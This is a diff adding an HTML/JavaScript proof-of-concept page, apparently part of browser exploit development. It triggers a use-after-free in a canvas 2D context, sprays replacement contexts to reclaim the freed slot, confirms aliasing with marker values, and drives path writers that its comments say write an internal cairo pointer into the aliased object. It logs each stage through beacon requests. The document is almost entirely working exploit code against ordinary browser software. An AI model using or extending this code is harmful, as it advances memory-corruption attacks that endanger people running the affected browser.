@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V929B</title></head>
+<body><pre id="out">V929B — path writer on LIVE alias (safe, directed; pointer written but unreadable via API)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V929B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,500))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+
+var P=new URLSearchParams(location.search);
+var NSAVES=+(P.get('saves')||'32');
+var NSPRAY=+(P.get('spray')||'300');
+var MARKER=+(P.get('marker')||'7777.77');
+
+bk('BOOT','saves='+NSAVES+',spray='+NSPRAY+',marker='+MARKER);
+say('BOOT');
+
+/* UAF (V573 pattern) */
+var innerCtx=null;
+(function(){
+  var c=document.createElement('canvas'); c.width=1; c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    var ctx=c.getContext('2d'); innerCtx=ctx;
+    for(var s=0;s<NSAVES;s++) ctx.save();
+    ctx.lineWidth=1.0; return true;
+  }});
+  try{ c.getContext('bitmaprenderer',d); }catch(e){ bk('TRIG-ERR',e.message); }
+})();
+bk('POST-UAF','ctx='+(innerCtx?'OK':'NULL'));
+if(!innerCtx){ bk('FAIL','no-inner'); say('FAIL'); }
+
+/* same-type spray */
+var sprayCtxs=[];
+for(var i=0;i<NSPRAY;i++){
+  var sc=document.createElement('canvas'); sc.width=1; sc.height=1;
+  var sctx=sc.getContext('2d');
+  if(sctx){ sctx.lineWidth=MARKER; sprayCtxs.push(sctx); }
+}
+bk('SPRAY','n='+sprayCtxs.length);
+
+/* confirm alias */
+var lwR, aliasCtx=null, aliasIdx=-1, errR;
+try { lwR=innerCtx.lineWidth; } catch(e){ errR='lw:'+e.message; }
+if(errR){ bk('READ','ERR:'+String(errR).slice(0,200)); say('READ ERR '+errR); }
+else {
+  bk('READ','lw='+lwR);
+  if(lwR===MARKER){
+    bk('RECLAIM','CONFIRMED');
+    try{ innerCtx.lineWidth=9999.99; }catch(e){}
+    for(var i=0;i<sprayCtxs.length;i++){
+      try{ if(sprayCtxs[i].lineWidth===9999.99){ aliasCtx=sprayCtxs[i]; aliasIdx=i; break; } }catch(e){}
+    }
+    bk('ALIAS','idx='+aliasIdx+',found='+(aliasCtx?'1':'0'));
+    say('ALIAS idx='+aliasIdx);
+  } else {
+    bk('RECLAIM','NO-marker lw='+lwR);
+  }
+}
+
+/* Directed: run path writers on the LIVE alias (safe). These reach ensureCairoPath()
+   and write cairo_t* at context+48 of the live object — but no Canvas API exposes raw bytes,
+   and we don't own the slot as AB, so the pointer is UNREADABLE (info-leak wall remains). */
+var live = aliasCtx || innerCtx;
+function tryWriter(name, fn){
+  try{
+    bk('W-PRE', name);
+    fn(live);
+    bk('W-OK', name+'|survived');
+    say('W-OK '+name);
+  }catch(e){
+    bk('W-ERR', name+'|'+e.name+':'+String(e.message).slice(0,120));
+    say('W-ERR '+name+' '+e.message);
+  }
+}
+
+if(live){
+  bk('WR-START','target='+(aliasCtx?'alias-spray#'+aliasIdx:'innerCtx'));
+  tryWriter('beginPath+moveTo', function(c){ c.beginPath(); c.moveTo(1,1); });
+  tryWriter('lineTo', function(c){ c.lineTo(50,50); });
+  tryWriter('rect', function(c){ c.beginPath(); c.rect(10,10,40,40); });
+  tryWriter('arc', function(c){ c.beginPath(); c.arc(30,30,10,0,Math.PI*2); });
+  tryWriter('roundRect', function(c){ try{ c.beginPath(); c.roundRect(5,5,20,20,3); }catch(e){ c.beginPath(); c.rect(5,5,20,20); } });
+  /* state sanity still alive */
+  try{ bk('POST-LW','lw='+live.lineWidth); }catch(e){ bk('POST-LW','ERR'); }
+  bk('WR-DONE','complete|note=ptr-written-but-unreadable-via-API');
+  say('WR-DONE (pointer may be written internally; unreadable via Canvas API / no AB-owned slot)');
+} else {
+  bk('WR-SKIP','no-live-ctx');
+}
+
+bk('DONE','complete');
+say('\nV929B complete.');
+</script>
+</body></html>
